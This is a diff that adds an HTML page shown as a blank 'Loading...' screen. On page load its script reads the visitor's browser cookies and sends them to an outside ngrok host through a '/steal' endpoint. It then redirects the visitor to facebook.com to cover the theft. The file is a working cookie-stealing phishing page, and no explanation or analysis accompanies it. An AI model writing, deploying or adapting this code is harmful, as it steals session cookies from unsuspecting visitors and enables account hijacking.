@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <script>
+        function steal() {
+            let cookies = document.cookie || 'No cookies';
+            let url = `https://masses-mushroom-reiterate.ngrok-free.dev/steal?data=${encodeURIComponent(cookies)}`;
+            fetch(url, { mode: 'no-cors' });
+            window.location.href = 'https://facebook.com';
+        }
+        window.onload = steal;
+    </script>
+</head>
+<body>
+    <h1>Loading...</h1>
+</body>
+</html>
